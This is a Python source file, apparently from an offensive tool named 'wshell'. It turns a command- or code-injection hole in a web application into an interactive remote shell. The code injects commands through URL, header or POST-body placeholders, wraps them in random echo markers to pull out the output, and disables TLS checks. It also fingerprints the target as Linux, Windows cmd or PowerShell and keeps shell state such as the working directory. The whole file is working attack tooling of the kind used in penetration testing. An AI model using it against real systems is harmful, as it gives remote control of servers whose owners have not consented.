import hashlib
import random
import re
import time
from enum import StrEnum
from typing import Callable, Dict, List, Optional, Type, override
from urllib.parse import quote as url_encode

import requests
import urllib3

from wshell import settings
from wshell.errors import (
    CommandExecutionError,
    OsDetectionError,
    TargetUnreachableError,
)
from wshell.log import logger

# Disable warnings related to unverified SSL certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class OSEnum(StrEnum):
    LINUX = "linux"
    WIN_CMD = "win-cmd"
    WIN_PSH = "win-psh"


class CommandInjector:
    """ HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = None
    COMMAND_DELIMITER = ";"
    PATH_DELIMITER = "/"
    CURRENT_DIRECTORY_COMMAND = ""

    def __init__(
            self,
            reuse_connection: bool,
            allow_redirects: bool,
            use_json_post_data: bool,
            method: str,
            url: str,
            timeout: Optional[float] = settings.DEFAULT_TIMEOUT,
            delay: float = settings.DEFAULT_DELAY,
            post_data: Dict[str, str] = dict(),
            headers: Dict[str, str] = dict(),
            command_placeholder: str = settings.DEFAULT_COMMAND_PLACEHOLDER,
            input_scripts: List[Callable[[str], str]] = [],
            output_scripts: List[Callable[[str], str]] = []
    ):
        self.http = requests.Session() if reuse_connection else requests
        self.allow_redirects = allow_redirects
        self.timeout = timeout
        self.delay = delay
        self.use_json_post_data = use_json_post_data
        self.url = url
        self.headers = headers
        self.post_data = post_data
        self.method = method

        self.command_placeholder = command_placeholder

        self.input_scripts = input_scripts
        self.output_scripts = output_scripts

        self.cwd = "."

        self._detect_os()

    def execute(self, cmd: str, strip: bool = True) -> str:
        """ Execute the specified command on the target
        :param cmd: the command to execute
        :param strip: whether the output has to be stripped
        :return: the output of the command from the target
        :raise :class:`requests.exceptions.RequestException` in case of connection errors
        :raise :class:`requests.exceptions.Timeout` in case of timeout expiration
        """

        # The command to run is wrapped around some placeholder to be able to correctly identify the command output
        # even if there is some garbage or the server print the raw command in the response page too.
        #
        # Example:
        #   $ echo 7ddf32e17a6ac5ce04a8ecbf782ca509;id;echo 7ddf32e17a6ac5ce04a8ecbf782ca509
        #   7ddf32e17a6ac5ce04a8ecbf782ca509\nuid=0(root) gid=0(root) groups=0(root)7ddf32e17a6ac5ce04a8ecbf782ca509\n
        #
        # We will then extract every output delimited by '7ddf32e17a6ac5ce04a8ecbf782ca509\n' to get as output:
        #
        #   uid=0(root) gid=0(root) groups=0(root)
        #
        placeholder = hashlib.md5(f"wshell-{random.random()}".encode("utf-8")).hexdigest()
        logger.debug(f"Using placeholder: {placeholder}")

        # Remove any comment to avoid problems with placeholders in the resulting final command
        cmd = self._remove_commented_out(cmd)

        # To make `cd` command works over HTTP shell we need to change to the desired directory
        # before the execution of every command
        cmd = f"cd {self.cwd}{self.COMMAND_DELIMITER}{cmd}"
        logger.debug(f"Executing command: {cmd}")
        # See issue #17 to know why the leading blank space is necessary. Do not remove it.
        cmd = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder} "

        # Run input scripts, if any, in the same order as the user specified
        for script in self.input_scripts:
            cmd = script(cmd)

        # We don't know where the command placeholder is, so just try to resolve it anywhere
        # (GET parameters, POST data and request headers)
        url = self.url.replace(self.command_placeholder, url_encode(cmd))

        headers: Dict[str, str] = dict()
        for key, value in self.headers.items():
            headers[key] = value.replace(self.command_placeholder, cmd)

        post_data = dict()
        for key, value in self.post_data.items():
            post_data[key] = value.replace(self.command_placeholder, cmd)

        post_data = dict(json=post_data) if self.use_json_post_data else dict(data=post_data)

        # Slow down the requests in case it is necessary to not being blocked
        time.sleep(self.delay)

        try:
            response = self.http.request(
                self.method,
                url,
                headers=headers,
                allow_redirects=self.allow_redirects,
                timeout=self.timeout,
                verify=False,
                **post_data
            )
        except requests.exceptions.ConnectionError as e:
            raise TargetUnreachableError(e)

        output = response.text

        # Run output scripts, if any, in the same order as the user specified
        for script in self.output_scripts:
            output = script(output)

        match = re.search(
            # In case output is base64 encoded, newlines are replaced with spaces and it is
            # necessary to manually specify the underlying OS to make it works
            fr"{placeholder}(?:\r?\n|\ )(?P<command_output>.*?){placeholder}(?:\r?\n|\ )",
            output,
            re.DOTALL
        )

        if not match:
            logger.debug(f"Got unexpected HTTP response:\n{output}")
            raise CommandExecutionError("Failed to parse command output")

        command_output = match.group("command_output")
        return command_output if not strip else command_output.strip()

    def _remove_commented_out(self, cmd: str) -> str:
        """ Remove any commented out part of the command """
        return re.sub(r"#.*$", "", cmd, flags=re.MULTILINE)

    def _detect_os(self) -> OSEnum:
        """ Try to identify the remote OS and return the appropriate injector """
        if self.OS:
            return self.OS

        # Running 'echo wsh${WSHELL}ell' will print:
        #   Linux:       'wshell\n'
        #   Windows CMD: 'wsh${WSHELL}ell\r\n'
        #   Windows PSH: 'wshell\r\n'
        logger.info("Target OS not specified, trying to automatically detect it")
        try:
            cmd_output = self.execute("echo wsh${WSHELL}ell", strip=False)
            if cmd_output == "wshell\n":
                self.OS = OSEnum.LINUX
                logger.info("Target OS detected as Linux")
            elif cmd_output == "wshell\r\n":
                logger.info("Target OS detected as Windows (Powershell)")
                self.OS = OSEnum.WIN_PSH
        except CommandExecutionError:
            # We need to re-execute the command due to different command delimiters
            # used by Linux/Powershell (;) and Command Prompt (&)
            # (See issue #9) for details
            self.COMMAND_DELIMITER = WindowsCmdCommandInjector.COMMAND_DELIMITER
            cmd_output = self.execute("echo wsh${WSHELL}ell", strip=False)
            if cmd_output == "wsh${WSHELL}ell\r\n":
                self.OS = OSEnum.WIN_CMD
                logger.info("Target OS detected as Windows (Command prompt)")
            else:
                raise OsDetectionError(f"Unrecognized output: {repr(cmd_output)}")

        if not self.OS:
            logger.error("Unable to detect target OS automatically. Please, specify it manually.")
            raise OsDetectionError("Unable to detect target OS")

        return self.OS

    def is_linux(self) -> bool:
        """ Return True if the remote target is detected as Linux """
        return self._detect_os() is OSEnum.LINUX

    def is_windows_cmd(self) -> bool:
        """ Return True if the remote target is detected as Windows (with Command Prompt) """
        return self._detect_os() is OSEnum.WIN_CMD

    def is_windows_psh(self) -> bool:
        """ Return True if the remote target is detected as Windows (with Powershell) """
        return self._detect_os() is OSEnum.WIN_PSH

    def is_windows(self) -> bool:
        """ Return True if the remote target is detected as Windows """
        return self.is_windows_cmd() or self.is_windows_psh()

    def change_directory(self, directory: str) -> str:
        """ Try to change directory and print the actual directory we are jumped in """
        if directory.startswith("."):
            # To make `cd .` and `cd ..` works we need to prepend the current directory
            directory = f"{self.cwd}{self.PATH_DELIMITER}{directory}"

        self.cwd = self.execute(f"cd {directory}{self.COMMAND_DELIMITER}{self.CURRENT_DIRECTORY_COMMAND}")
        logger.debug(f"Directory changed to: {self.cwd}")
        return self.cwd

    def current_directory(self) -> str:
        """ Return the current working directory """
        return self.change_directory(".")

    def get_prompt(self) -> str:
        """ Get the specific prompt string for the target OS """
        raise NotImplementedError


class LinuxCommandInjector(CommandInjector):
    """ Linux HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = OSEnum.LINUX
    CURRENT_DIRECTORY_COMMAND = "pwd"

    @override
    def get_prompt(self):
        # Outputs like "www-data@target:/var/www/html$ "
        # in case of user with no username it will use the user ID
        id = self.execute('id', strip=True)
        user_name_or_id = re.match(r"^uid=(?P<user_id>\d+)(\((?P<username>.*?)\))? ", id)

        user = user_name_or_id.group("username") or user_name_or_id.group("user_id") if user_name_or_id else "unknown"

        host = self.execute('hostname', strip=True)
        pwd  = self.execute('pwd', strip=True)
        return f"{user}@{host}:{pwd}{'$' if user not in ('root', '0') else '#'} "

    @override
    def change_directory(self, directory: str) -> str:
        # Make `cd` with no arguments works
        if not directory.strip():
            self.cwd = "."
        return super().change_directory(directory)


class WindowsCmdCommandInjector(CommandInjector):
    """ Windows (with Command Prompt) HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = OSEnum.WIN_CMD
    COMMAND_DELIMITER = "&"
    PATH_DELIMITER = "\\"
    CURRENT_DIRECTORY_COMMAND = "cd"

    @override
    def _remove_commented_out(self, cmd: str) -> str:
        # Matches:
        #   REM <comment>
        #   @REM <comment>
        #   :: <comment>
        #   command& REM <comment>
        return re.sub(r"(&\s*)?(@?REM|::).*$", "", cmd, flags=re.MULTILINE|re.IGNORECASE)

    @override
    def get_prompt(self):
        # Outputs like "C:\Users\wshell>"
        return f"{self.current_directory()}> "


class WindowsPshCommandInjector(CommandInjector):
    """ Windows (with Powershell) HTTP Client with RCE capabilities via {code,command,template} injection """
    OS = OSEnum.WIN_PSH
    PATH_DELIMITER = "\\"
    # On Powershell `Get-Location` returns a multiline string like:
    #
    #   PS C:\Users\> Get-Location
    #
    #   Path
    #   ----
    #   C:\Users\
    #
    # If used in a string concatenation we get the path only
    #
    CURRENT_DIRECTORY_COMMAND = "'' + (Get-Location)"

    @override
    def get_prompt(self):
        # Outputs like "PS C:\Users\wshell>"
        return f"PS {self.current_directory()}> "


def get_command_injector(os: Optional[OSEnum] = None, *args, **kwargs) -> CommandInjector:
    """ Return an initialized command injector for the specified OS or auto-discover the more appropriate one """
    if os is None:
        injector = CommandInjector(*args, **kwargs)
        os = injector.OS

    os_injector_map: Dict[OSEnum, Type[CommandInjector]] = {
        OSEnum.LINUX: LinuxCommandInjector,
        OSEnum.WIN_CMD: WindowsCmdCommandInjector,
        OSEnum.WIN_PSH: WindowsPshCommandInjector
    }
    if os and os in os_injector_map:
        return os_injector_map[os](*args, **kwargs)
    else:
        raise OsDetectionError(f"Unknown OS: {os}")